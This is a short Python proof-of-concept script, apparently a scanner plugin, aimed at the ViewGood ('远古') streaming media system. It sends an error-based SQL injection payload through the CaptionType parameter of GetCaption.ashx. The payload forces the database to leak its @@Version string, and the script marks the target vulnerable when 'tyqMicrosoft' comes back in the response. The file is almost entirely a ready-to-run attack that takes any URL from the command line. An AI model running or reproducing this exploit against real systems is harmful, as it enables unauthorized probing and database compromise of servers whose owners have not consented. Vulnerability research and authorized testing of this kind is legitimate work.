#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 远古流媒体系统  GetCaption.ashx注入
referer: unknown
author: Lucifer
description: 文件GetCaption.ashx中,参数CaptionType存在SQL注入。
'''
import sys
import requests
import warnings
def run(url):
        result = ['远古流媒体系统  GetCaption.ashx注入','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/VIEWGOOD/ADI/portal/GetCaption.ashx?CaptionType=1%27AnD%201%3DConVert%28Int%2C%28Char%28116%29%252bChar%28121%29%252bChar%28113%29%252b@@Version%29%29--&AssetID=1&CaptionName=11"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"tyqMicrosoft" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
